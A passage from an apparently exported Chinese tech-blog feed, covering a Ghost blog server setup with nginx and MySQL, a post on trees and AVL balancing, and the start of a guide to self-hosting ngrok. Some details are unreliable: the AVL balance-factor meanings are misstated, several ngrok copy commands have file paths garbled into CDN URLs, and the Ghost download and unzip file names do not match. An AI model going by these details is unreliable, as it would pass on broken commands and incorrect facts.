class="attribute">ssl_certificate</span>/etc/crt.crt;<span class="comment">#证书crt的绝对路径;</span></span><br><span class="line"><span class="attribute">ssl_certificate_key</span>    /etc/private.key;<span class="comment">#私钥key的绝对路径;</span></span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_set_header</span>   X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span>   Host      <span class="variable">$http_host</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://127.0.0.1:2368;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存退出，然后重启 <code>Nginx</code> 生效配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h3 id="2-3-安装-MySQL-并配置"><a href="#2-3-安装-MySQL-并配置" class="headerlink" title="2.3 安装 MySQL 并配置"></a>2.3 安装 <code>MySQL</code> 并配置</h3><p>Ghost 默认使用 <code>sqlite3 数据库</code> ， <code>sqlite3 数据库</code> 功能简约，小型化，追求最大磁盘效率，而 <code>MySQL</code> 是完善的服务器数据库，功能全面，综合化，追求最大并发效率，所以我这里使用的是 <code>MySQL</code> ，下面是操作命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install mysql-server <span class="comment"># 安装Mysql  </span></span><br><span class="line">/etc/init.d/mysql restart <span class="comment"># 启动/重新启动Mysql</span></span><br><span class="line">mysql_secure_installation <span class="comment">#配置Mysql</span></span><br></pre></td></tr></table></figure><p>输入 <code>mysql_secure_installation</code> 回车后，系统可能会询问一些 <code>MySQL</code> 的用户密码安全措施，建议在设置时选择 <code>1 or MEDIUM</code> 即可，这是说明你的 <code>MySQL</code> 用户密码必须包括”数字、大写字母、小写字母、特殊字符”，部分配置的解释为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Set root password? [Y/n] <span class="comment"># 设置root密码  </span></span><br><span class="line">anonymous <span class="built_in">users</span>? [Y/n] <span class="comment"># 删除匿名用户  </span></span><br><span class="line">Disallow root login remotely? [Y/n] <span class="comment"># 禁止root用户远程登录  </span></span><br><span class="line">Remove <span class="built_in">test</span> database and access to it? [Y/n] <span class="comment"># 删除默认的 test 数据库  </span></span><br><span class="line">Reload privilege tables now? [Y/n] <span class="comment"># 刷新授权表使修改生效</span></span><br></pre></td></tr></table></figure><p>为了防止在 <code>MySQL</code> 数据库中出现中文乱码，需要设置 <code>MySQL</code> 的编码，编辑 <code>/etc/mysql/my.cnf</code> 写入如下信息后保存退出，并重启 <code>MySQL</code> 服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line">[mysqld]</span><br><span class="line">character-set-server=utf8mb4</span><br><span class="line">collation-server=utf8mb4_unicode_ci</span><br><span class="line">skip-character-set-client-handshake = <span class="literal">true</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart <span class="comment">#重启MySQL服务</span></span><br></pre></td></tr></table></figure><p>然后我们新建一个数据库用来存放博客中的文章等信息，并且建立一个用户管理该数据库，由于我们之前设置的 <code>MySQL</code> 数据库用户密码策略，所以密码必须包含”数字、大写字母、小写字母、特殊字符”：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p <span class="comment"># 输入设置好的密码  </span></span><br><span class="line">create database ghost; <span class="comment"># 创建ghost数据库  </span></span><br><span class="line"><span class="comment"># 新建一个用户ghost，密码为123456Aa!并将ghost数据库授权给它</span></span><br><span class="line">grant all privileges on ghost.* to <span class="string">&#x27;ghost&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;123456Aa!&#x27;</span>; </span><br><span class="line">flush privileges <span class="comment"># 重新读取权限表中的数据到内存，不用重启mysql就可以让权限生效</span></span><br></pre></td></tr></table></figure><h3 id="2-4-安装-Ghost-并配置"><a href="#2-4-安装-Ghost-并配置" class="headerlink" title="2.4 安装 Ghost 并配置"></a>2.4 安装 <code>Ghost</code> 并配置</h3><p>下载并解压Ghost：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www</span><br><span class="line">wget https://ghost.org/zip/ghost-latest.zip</span><br><span class="line">unzip Ghost-0.11.9.zip -d ghost</span><br><span class="line"><span class="built_in">cd</span> ghost</span><br></pre></td></tr></table></figure><p>修改配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> config.example.js config.js  </span><br><span class="line">vi config.js</span><br></pre></td></tr></table></figure><p> <code>Ghost</code> 有生产模式、开发模式和测试模式等多种运行模式，这里我们需要在配置文件中找到 <code>production</code> 模式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生产模式</span></span><br><span class="line">production: &#123;  </span><br><span class="line">    url: <span class="string">&#x27;http://snowz.me&#x27;</span>, <span class="comment"># 修改为你的域名或者IP，注意加上http://</span></span><br><span class="line">    mail: &#123;&#125;,</span><br><span class="line">    database: &#123;</span><br><span class="line">        client: <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">        connection: &#123;</span><br><span class="line">            host     : <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">            user     : <span class="string">&#x27;ghost&#x27;</span>, <span class="comment"># 数据库连接的用户</span></span><br><span class="line">            password : <span class="string">&#x27;123456Aa!&#x27;</span>, <span class="comment"># 先前创建的密码</span></span><br><span class="line">            database : <span class="string">&#x27;ghost&#x27;</span>, <span class="comment"># 先前创建的数据库</span></span><br><span class="line">            charset  : <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    server: &#123;</span><br><span class="line">            host: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">            port: <span class="string">&#x27;2368&#x27;</span> <span class="comment"># 若修改该端口记得在nginx中做相应改变</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>接下来下载 <code>Ghost</code> 所需要的依赖包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org </span><br><span class="line">npm info underscore（如果上面配置正确这个命令会有字符串response）</span><br><span class="line">npm install --production --unsafe-perm</span><br></pre></td></tr></table></figure><blockquote><p> 上面代码的解释如下：</p></blockquote><ul><li><code>npm config set registry https://registry.npm.taobao.org</code> 是修改一下 <code>npm</code> 的镜像源，避免因为 <code>GFW</code> 而下载依赖包失败，其他修改方法见<a href="https://cnodejs.org/topic/4f9904f9407edba21468f31e" target="_blank">这里</a>；</li><li>添加 <code>--unsafe-perm</code> 的参数的原因是：如果我们不添加这个参数，会出现类似于 <code>npm WARN cannot run in wd test@0.0.0 echo something (wd=/Users/Lloyd/Documents/test)</code> 的错误，原因是如果使用 <code>root</code> 权限调用 <code>npm</code> ，那么它会将 <code>uid</code> 更改为用户配置指定的 <code>uid</code> ，默认为 <code>nobody</code> ，设置 <code> --unsafe-perm</code> 参数以使用 <code>root</code> 权限运行脚本；</li></ul><h2 id="1-5-开机后博客自动运行"><a href="#1-5-开机后博客自动运行" class="headerlink" title="1.5 开机后博客自动运行"></a>1.5 开机后博客自动运行</h2><p>安装 <code>PM2</code> 让 <code>Ghost</code> 可以在开机后自动后台运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org  </span><br><span class="line">cnpm install pm2 -g  </span><br><span class="line">NODE_ENV=production pm2 start index.js --name <span class="string">&quot;ghost&quot;</span>  </span><br><span class="line">pm2 startup ubuntu </span><br><span class="line">pm2 save</span><br></pre></td></tr></table></figure><p>我们需要打开 <code>/etc/rc.local</code> 文件在其中添加如下代码，让 <code>MySQL</code> 和 <code>Nginx</code> 开机自动运行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql restart</span><br><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h1 id="2-出现的一些问题"><a href="#2-出现的一些问题" class="headerlink" title="2.出现的一些问题"></a>2.出现的一些问题</h1><h2 id="2-1-config-js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题："><a href="#2-1-config-js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题：" class="headerlink" title="2.1 config.js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题："></a>2.1 config.js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题：</h2><p>之前就曾在安装完运行过程中发现网站的针对谷歌的复合搜索卡中的URL是http的，如果改成https，浏览器提示重定向次数过多。由于不妨碍使用，当时就没注意。</p><p>今天(<code>2017/06/03</code>) 在 Search Console 中发现 <code>我们在您的网站上未找到复合搜索卡的任何结构化数据。</code> 的提示信息。先通过谷歌的<a href="https://search.google.com/structured-data/testing-tool" target="_blank">结构化数据测试工具</a>检测了一番，发现我的复合搜索卡结构语法并没有错误，然后谷歌提供的<a href="https://support.google.com/webmasters/answer/6381755?#debugging" target="_blank">问题排查</a>，我发现是由于config.js文件中配置的是<a href="http://bugwz.com/">http://bugwz.com</a> ，而我在谷歌的Search Console中配置的是<a href="https://bugwz.com/">https://bugwz.com</a> ，导致Search Console 资源必须与托管网站不匹配，所以最后查阅一番，修正方法为在nginx的配置文件中的 <code>location /</code> 配置中加入如下代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>; //其中<span class="variable">$scheme</span>也可以直接写为https</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ghost </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树、二叉树、完全/满/平衡二叉树的理解与对比</title>
      <link href="/2017/05/01/tree/"/>
      <url>/2017/05/01/tree/</url>
      
        <content type="html"><![CDATA[<h2 id="一、树"><a href="#一、树" class="headerlink" title="一、树"></a>一、树</h2><p>树是一种重要的非线性数据结构，直观地看，它是数据元素（在树中称为结点）按分支关系组织起来的结构，很像自然界中的树那样。树型结构也是信息的重要组织形式之一，一切具有层次关系的问题都可用树来描述。</p><h3 id="1-1、相关概念"><a href="#1-1、相关概念" class="headerlink" title="1.1、相关概念"></a>1.1、相关概念</h3><ul><li><p><code>路径</code>：顺着节点的边从一个节点走到另一个节点，所经过的节点的顺序排列就称为路径；</p></li><li><p><code>根</code>：树顶端的节点称为根，一棵树只有一个根，如果要把一个节点和边的集合称为树，那么从根到其他任何一个节点都必须有且只有一条路径；</p></li><li><p><code>父节点</code>：若一个节点含有子节点，则这个节点称为其子节点的父节点；</p></li><li><p><code>子节点</code>：一个节点含有的子树的根节点称为该节点的子节点；</p></li><li><p><code>兄弟节点</code>：具有相同父节点的节点互称为兄弟节点；</p></li><li><p><code>叶节点</code>：没有子节点的节点称为叶节点，也叫叶子节点；</p></li><li><p><code>子树</code>：每个节点都可以作为子树的根，它和它所有的子节点、子节点的子节点等都包含在子树中；</p></li><li><p><code>节点的层次</code>：从根开始定义，根为第一层，根的子节点为第二层，以此类推；</p></li><li><p><code>深度</code>：对于任意节点n，n的深度为从根到n的唯一路径长，根的深度为0；</p></li><li><p><code>高度</code>：对于任意节点n，n的高度为从n到一片树叶的最长路径长，所有树叶的高度为0；</p></li><li><p><code>森林</code>：0个或多个不相交的树组成，对森林加上一个根，森林即成为树；删去根，树即成为森林；</p></li><li><p><code>节点的度</code>：节点拥有的子树的数目；</p></li><li><p><code>树的度</code>：树中节点的最大的度；</p></li></ul><ul><li><code>叶子节点</code>：度为零的节点；</li><li><code>分支节点</code>：度不为零的节点；</li><li><code>层次</code>：根节点的层次为<code>1</code>，其余节点的层次等于该节点的双亲节点的层次加<code>1</code>；</li><li><code>树的高度</code>：树中节点的最大层次；</li><li><code>无序树</code>：树中节点的各子树之间的次序是不重要的，可以交换位置；</li><li><code>有序树</code>：树中节点的各子树之间的次序是重要的，不可以交换位置；</li></ul><h3 id="1-2、定义"><a href="#1-2、定义" class="headerlink" title="1.2、定义"></a>1.2、定义</h3><ul><li>树是由一个或多个节点组成的有限集合；</li><li>树中必有一个特定的称为根的节点；</li><li>剩下的节点被分成 <code>n&gt;=0</code> 个互不相交的集合<code>T1</code>、<code>T2</code>、……<code>Tn</code>，并且这些每个集合又都是一个树。树<code>T1</code>、<code>T2</code>、……<code>Tn</code>被称作根的子树；</li></ul><h3 id="1-3、特点"><a href="#1-3、特点" class="headerlink" title="1.3、特点"></a>1.3、特点</h3><ul><li><strong>对比二叉树</strong><ul><li>树中节点的最大度数（节点的分叉）没有限制，而二叉树节点的最大度数（节点的分叉）数量为2；</li><li>树的节点无左、右之分，而二叉树的节点有左、右之分；</li></ul></li></ul><h3 id="1-4、表示方法"><a href="#1-4、表示方法" class="headerlink" title="1.4、表示方法"></a>1.4、表示方法</h3><p>树的表示方法有许多，常用的方法是用<strong>括号</strong>：</p><ul><li>先将根结点放入一对圆括号中，然后把它的子树由左至右的顺序放入括号中，而对子树也采用同样的方法处理；</li><li>同层子树与它的根节点用圆括号括起来，同层子树之间用逗号隔开，最后用闭括号括起来；</li></ul><h3 id="1-5、示例图"><a href="#1-5、示例图" class="headerlink" title="1.5、示例图"></a>1.5、示例图</h3><p><img src="https://cdn.bugwz.com/tree.png" alt="树"></p><p>如上图可使用<strong>括号表示法</strong>写成：<code>(A(B(E,F),C(G),D(H,M)))</code></p><h2 id="二、二叉树"><a href="#二、二叉树" class="headerlink" title="二、二叉树"></a>二、二叉树</h2><p>二叉树（Binary Tree）是包含<code>n</code>个节点的有限集合，当n为零时该集合为空集，或者该集合由一个根节点和两棵互不相交的、分别称为根节点的左子树和右子树的二叉树组成。</p><h3 id="2-1、定义"><a href="#2-1、定义" class="headerlink" title="2.1、定义"></a>2.1、定义</h3><ul><li>树中每个节点最多有两个子树，不存在度（分叉）大于2的节点；</li><li>子树有左右之分，次序不能颠倒；</li></ul><h3 id="2-2、基本形态"><a href="#2-2、基本形态" class="headerlink" title="2.2、基本形态"></a>2.2、基本形态</h3><ul><li><p>空二叉树</p></li><li><p>只有一个根结点的二叉树</p></li><li><p>只有右子树</p></li><li><p>只有左子树</p></li><li><p>完全二叉树：除了树的最后一层外，其他的节点既有左子树又有右子树；</p></li></ul><h3 id="2-3、示例图"><a href="#2-3、示例图" class="headerlink" title="2.3、示例图"></a>2.3、示例图</h3><p><img src="https://cdn.bugwz.com/tree-binary-tree.png" alt="二叉树"></p><h2 id="三、完全二叉树"><a href="#三、完全二叉树" class="headerlink" title="三、完全二叉树"></a>三、完全二叉树</h2><p>对于深度为 $k$ ，有 $n$ 个结点的二叉树，当且仅当其每一个结点都与深度为 $k$的满二叉树中编号从<code>1</code>至<code>n</code>的结点一一对应时称之为完全二叉树。</p><h3 id="3-1、定义"><a href="#3-1、定义" class="headerlink" title="3.1、定义"></a>3.1、定义</h3><ul><li>符合二叉树的定义规则；</li><li>除二叉树的最高层<code>h</code>外，其它各层 (<code>1</code>～<code>h-1</code>) 的节点数都达到最大个数；</li><li>第<code>h</code>层有叶子结点，并且叶子结点都是从左到右依次排布；</li></ul><h3 id="3-2、示例图"><a href="#3-2、示例图" class="headerlink" title="3.2、示例图"></a>3.2、示例图</h3><p><img src="https://cdn.bugwz.com/tree-complete-binary-tree.png" alt="完全二叉树"></p><h2 id="四、满二叉树"><a href="#四、满二叉树" class="headerlink" title="四、满二叉树"></a>四、满二叉树</h2><p>一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是满二叉树。也就是说，如果一个二叉树的层数为 $k$，且结点总数是 $2^k -1$ ，则它就是满二叉树。</p><h3 id="4-1、定义"><a href="#4-1、定义" class="headerlink" title="4.1、定义"></a>4.1、定义</h3><ul><li>符合完全二叉树的定义；</li><li>每个节点都有左右子叶并且叶子节点都处于最底层；</li></ul><h3 id="4-2、特点"><a href="#4-2、特点" class="headerlink" title="4.2、特点"></a>4.2、特点</h3><ul><li>满二叉树一定是平衡二叉树，平衡二叉树不一定是满二叉树；</li></ul><h3 id="4-3、示例图"><a href="#4-3、示例图" class="headerlink" title="4.3、示例图"></a>4.3、示例图</h3><p><img src="https://cdn.bugwz.com/tree-full-binary-tree.png" alt="满二叉树"></p><h2 id="五、平衡二叉树（AVL树）"><a href="#五、平衡二叉树（AVL树）" class="headerlink" title="五、平衡二叉树（AVL树）"></a>五、平衡二叉树（AVL树）</h2><p>平衡二叉树（又称<code>平衡二叉查找树</code>），由前苏联的数学家 <code>Adelse-Velskil</code> 和 <code>Landis</code> 在 <code>1962年</code>提出的高度平衡的二叉树，根据科学家的英文名也称为 <code>AVL树</code>。平衡二叉树的常用实现方法有<code>红黑树</code>、<code>AVL</code>、<code>替罪羊树</code>、<code>Treap</code>、<code>伸展树</code>等。 </p><p>最小二叉平衡树的节点的公式为<code>F(n)=F(n-1)+F(n-2)+1</code>，这个类似于一个递归的数列，可参考<code>Fibonacci数列</code>，公式解释为：</p><ul><li><code>1</code>是根节点；</li><li><code>F(n-1)</code>是左子树的节点数量；</li><li><code>F(n-2)</code>是右子树的节点数量；</li></ul><h3 id="5-1、特点"><a href="#5-1、特点" class="headerlink" title="5.1、特点"></a>5.1、特点</h3><ul><li>可以为空树；</li><li>左右子树的高度相差<code>不超过 1</code> （<code>平衡因子</code>的绝对值不超过<code>1</code>）的树，并且左右子数都是一个平衡二叉树；</li></ul><h3 id="5-2、平衡因子"><a href="#5-2、平衡因子" class="headerlink" title="5.2、平衡因子"></a>5.2、平衡因子</h3><ul><li><code>-1</code>：表示左子树比右子树高；</li><li><code>0</code>：表示右子树比左子树高；</li><li><code>1</code>：表示左子树和右子树等高；</li></ul><h3 id="5-3、示例图"><a href="#5-3、示例图" class="headerlink" title="5.3、示例图"></a>5.3、示例图</h3><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree.png" alt="平衡二叉树"></p><h3 id="5-4、失衡调整"><a href="#5-4、失衡调整" class="headerlink" title="5.4、失衡调整"></a>5.4、失衡调整</h3><p>平衡二叉树调整后，它的中序遍历的顺序是不会改变的。</p><h4 id="5-4-1、插入时的失衡调整"><a href="#5-4-1、插入时的失衡调整" class="headerlink" title="5.4.1、插入时的失衡调整"></a>5.4.1、插入时的失衡调整</h4><p>所有的不平衡情况中，都是按照<code>寻找最小不平衡树</code>  &#x3D;&gt; <code>寻找所属的不平衡类别</code>  &#x3D;&gt; <code>根据4种类别进行固定化程序的操作</code>；</p><h5 id="5-4-1-1、LL型调整（左子树过高）"><a href="#5-4-1-1、LL型调整（左子树过高）" class="headerlink" title="5.4.1.1、LL型调整（左子树过高）"></a>5.4.1.1、LL型调整（左子树过高）</h5><ul><li>首先找到最小不平衡的子树，再以其根节点向右旋转（向右旋转后相当于右面的子数的树高加1，而左面的子数的树高减1）；</li><li>旋转之后源根节点的左孩子作为新的根节点，<strong>原来根节点的左孩子作为新的根节点</strong>；</li><li>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</li></ul><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree-ll.png" alt="LL型调整"></p><h5 id="5-4-1-2、RR型调整（右子树过高）"><a href="#5-4-1-2、RR型调整（右子树过高）" class="headerlink" title="5.4.1.2、RR型调整（右子树过高）"></a>5.4.1.2、RR型调整（右子树过高）</h5><ul><li>首先找到最小不平衡的子树，再以其根节点向左旋转（向右旋转后相当于左面的子数的树高加1，而右面的子数的树高减1）；</li><li>旋转之后源根节点的右孩子作为新的根节点，<strong>原来根节点的右孩子作为新的根节点</strong>；</li><li>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</li></ul><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree-rr.png" alt="RR型调整"></p><h5 id="5-4-1-3、LR型调整（左子树过高）"><a href="#5-4-1-3、LR型调整（左子树过高）" class="headerlink" title="5.4.1.3、LR型调整（左子树过高）"></a>5.4.1.3、LR型调整（左子树过高）</h5><ul><li><p>以较高子树的根节点为中心向左进行旋转（示例图中为左子树较高，左子树的根为<code>节点1</code>），可以理解成先转换为<code>LL型</code>；</p></li><li><p>以原根节点为中心，向右旋转（实例图中以<code>节点3</code>为中心，向右旋转）；</p></li><li><p>调整之后，<strong>原来根节点的左孩子的右孩子作为新的根节点</strong>；</p></li><li><p>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</p></li></ul><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree-lr.png" alt="LR调整"></p><h5 id="5-4-1-4、RL型调整（右子树过高）"><a href="#5-4-1-4、RL型调整（右子树过高）" class="headerlink" title="5.4.1.4、RL型调整（右子树过高）"></a>5.4.1.4、RL型调整（右子树过高）</h5><ul><li><p>以根节点的右孩子为中心向右进行旋转（示例图中为右子树较高，右子树的根为<code>节点3</code>），可以理解成先转换为<code>RR型</code>；</p></li><li><p>以原根节点为中心，向右旋转（示例图中以<code>节点1</code>为中心，向左旋转）；</p></li><li><p>调整之后，<strong>原来根节点的右孩子的左孩子作为新的根节点</strong>；</p></li><li><p>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</p></li></ul><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree-rl.png" alt="RL调整"></p><h4 id="5-4-2、删除时的失衡调整"><a href="#5-4-2、删除时的失衡调整" class="headerlink" title="5.4.2、删除时的失衡调整"></a>5.4.2、删除时的失衡调整</h4><h5 id="5-4-2-1、LE型（左子树过高）"><a href="#5-4-2-1、LE型（左子树过高）" class="headerlink" title="5.4.2.1、LE型（左子树过高）"></a>5.4.2.1、LE型（左子树过高）</h5><ul><li>以下初始场景只会在删除时才会出现，删除后可按照<code>LL型</code>的调整策略进行调整；</li></ul><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree-le.png" alt="LE调整"></p><h5 id="5-4-2-2、RE型（右子树过高）"><a href="#5-4-2-2、RE型（右子树过高）" class="headerlink" title="5.4.2.2、RE型（右子树过高）"></a>5.4.2.2、RE型（右子树过高）</h5><ul><li>以下初始场景只会在删除时才会出现，删除后可按照<code>RR型</code>的调整策略进行调整；</li></ul><p><img src="https://cdn.bugwz.com/tree-balanced-binary-tree-re.png" alt="RE调整"></p><h2 id="六、数据对比"><a href="#六、数据对比" class="headerlink" title="六、数据对比"></a>六、数据对比</h2><table><thead><tr><th align="center">种类</th><th align="center">第 $n$ 层的节点数</th><th align="center">深度为 $n$ 的树节点数</th><th align="center">节点数为 $n$ 的树的高度</th></tr></thead><tbody><tr><td align="center">二叉树</td><td align="center">$2^{n-1}$ (最多)</td><td align="center">$2^n-1$ (最多)</td><td align="center">$\log_2(n+1)$ (最少)</td></tr><tr><td align="center">完全二叉树</td><td align="center">$2^{n-1}$ (最多)</td><td align="center">$2^n-1$ (最多)</td><td align="center"></td></tr><tr><td align="center">满二叉树</td><td align="center">$2^{n-1}$</td><td align="center">$2^n-1$</td><td align="center">$\log_2(n+1)$</td></tr><tr><td align="center">平衡二叉树</td><td align="center">$2^{n-1}$ (最多)，1 (最少)</td><td align="center">$2^n-1$ (最多)，$2^{n-1}-1+1$ (最少)</td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Ngrok搭建私有的内网穿透服务器</title>
      <link href="/2017/04/27/ngrok-secure-tunnels-to-localhost/"/>
      <url>/2017/04/27/ngrok-secure-tunnels-to-localhost/</url>
      
        <content type="html"><![CDATA[<h2 id="一、关于Ngrok"><a href="#一、关于Ngrok" class="headerlink" title="一、关于Ngrok"></a>一、关于Ngrok</h2><p>Ngrok 是用Go语言写的一个反向代理软件，Ngrok 服务可以分配给你一个域名让你本地的web项目可供外网访问，Ngrok解决了内网穿透这十分棘手的问题，可以让我们不需要公网IP的情况下，轻松向他人展示本机的Web Demo等信息。Ngrok 官网本身还提供了公共服务，只需要注册一个帐号，运行它的客户端，就可以快速把内网映射出去,不过这么好的服务，没多久就被墙了,幸运的是，Ngrok的1.x的源码被公布了出来，我们可以利用它的源码去构建属于我们自己的Ngrok内网穿透服务器。</p><p>据官方所说由于 Ngrok 存在一些已知的问题，例如内存泄漏等对稳定使用影响较大，原文内容如下：</p><blockquote><p>DO NOT RUN THIS VERSION OF NGROK (1.X) IN PRODUCTION. Both the client and server are known to have serious reliability issues including memory and file descriptor leaks as well as crashes. There is also no HA story as the server is a SPOF. </p></blockquote><p>不过，当你使用了Ngrok之后，你绝对会对他赞不绝口，当你内网中的一台机器开着Ngrok时，即使那台机器突然断网了，只要电脑之后连接上了网络，Ngrok就会立马自动开始工作，很人性化。</p><h2 id="二、Linux下Ngrok服务器的搭建及客户端的生成"><a href="#二、Linux下Ngrok服务器的搭建及客户端的生成" class="headerlink" title="二、Linux下Ngrok服务器的搭建及客户端的生成"></a>二、Linux下Ngrok服务器的搭建及客户端的生成</h2><ul><li>服务器环境：CentOS 7.2 64位&#x2F;Ubuntu Server 16.04.1 LTS 64位</li><li>客户端环境：Windows 10 版本10.0.14393</li></ul><h3 id="2-1、搭建Ngrok服务器所必需的环境条件"><a href="#2-1、搭建Ngrok服务器所必需的环境条件" class="headerlink" title="2.1、搭建Ngrok服务器所必需的环境条件"></a>2.1、搭建Ngrok服务器所必需的环境条件</h3><ul><li>CentOS下的命令：<br>更新系统软件环境，并安装所需要的mercurial git gcc golang软件包：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install mercurial git gcc golang</span><br></pre></td></tr></table></figure></li><li>Ubuntu Server下的命令：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential golang mercurial git</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-2、下载Ngrok的源码"><a href="#2-2、下载Ngrok的源码" class="headerlink" title="2.2、下载Ngrok的源码"></a>2.2、下载Ngrok的源码</h3><p>假如我们当前处于&#x2F;root目录，然后我们需要从GitHub上面下载下来Ngrok的源码文件，下面提供三个link，一个官方地址(可能会报错)，一个第三方地址，一个是我Fork别人的。由于访问 github 不太顺畅，有可能下载的时候链接会中断，所以如果出错了就再运行一遍。执行完</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/inconshreveable/ngrok.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/tutumcloud/ngrok.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/CUBEGWZ/ngrok.git</span><br></pre></td></tr></table></figure><p>执行完上面的代码后，我们 <code>ls</code> 就可以发现&#x2F;root&#x2F;目录下存在一个ngrok目录。</p><h3 id="2-3、生成证书"><a href="#2-3、生成证书" class="headerlink" title="2.3、生成证书"></a>2.3、生成证书</h3><p>我们在此之前需要确定已经有一个域名可以成功的泛解析映射到目标服务器上了。由于我们下载的Ngrok源码是官方提供的，所以其中的SSL证书当然不是针对目前我们所拥有的域名的，所以我们需要为当前域名配置SSL证书，并把信息写入服务器文件中去，还有一点，我们之后编译客户端的时候也会将这些信息编译进客户端，客户端内的信息必须与服务器端的信息相一致。</p><p>此处假设我想让使用我的Ngrok服务的人们那里获得的域名形似为”*.ngrok.testbug.top”，那么接下来我的设置如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/ngrok</span><br><span class="line"><span class="comment">#这里修改为自己想要设置的域名变量，便于后面使用</span></span><br><span class="line">NGROK_DOMAIN=<span class="string">&quot;ngrok.testbug.top&quot;</span></span><br><span class="line"></span><br><span class="line">openssl genrsa -out rootCA.key 2048</span><br><span class="line">openssl req -x509 -new -nodes -key rootCA.key -subj <span class="string">&quot;/CN=<span class="variable">$NGROK_DOMAIN</span>&quot;</span> -days 5000 -out rootCA.pem</span><br><span class="line">openssl genrsa -out device.key 2048</span><br><span class="line">openssl req -new -key device.key -subj <span class="string">&quot;/CN=<span class="variable">$NGROK_DOMAIN</span>&quot;</span> -out device.csr</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000</span><br></pre></td></tr></table></figure><p>然后我们会发现&#x2F;root&#x2F;ngrok目录下会多出六个文件，他们分别是”rootCA.key”,”rootCA.pem”,”rootCA.srl”,”device.key”,”device.csr”,”device.crt”，然后我们将”rootCA.pem”,”device.crt”,”device.key”这三个文件复制替换&#x2F;root&#x2F;ngrok&#x2F;<a href="https://cdn.bugwz.com/client/tls/%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E4%B8%89%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%EF%BC%9A">https://cdn.bugwz.com/client/tls/目录下的三个文件，代码如下所示：</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\<span class="built_in">cp</span> rootCA.pem https://cdn.bugwz.com/client/tls/ngrokroot.crt -f</span><br><span class="line">\<span class="built_in">cp</span> device.crt https://cdn.bugwz.com/server/tls/snakeoil.crt  -f</span><br><span class="line">\<span class="built_in">cp</span> device.key https://cdn.bugwz.com/server/tls/snakeoil.key -f</span><br></pre></td></tr></table></figure><h3 id="2-4、生成服务器端-ngrokd-与编译客户端的ngrok"><a href="#2-4、生成服务器端-ngrokd-与编译客户端的ngrok" class="headerlink" title="2.4、生成服务器端 ngrokd 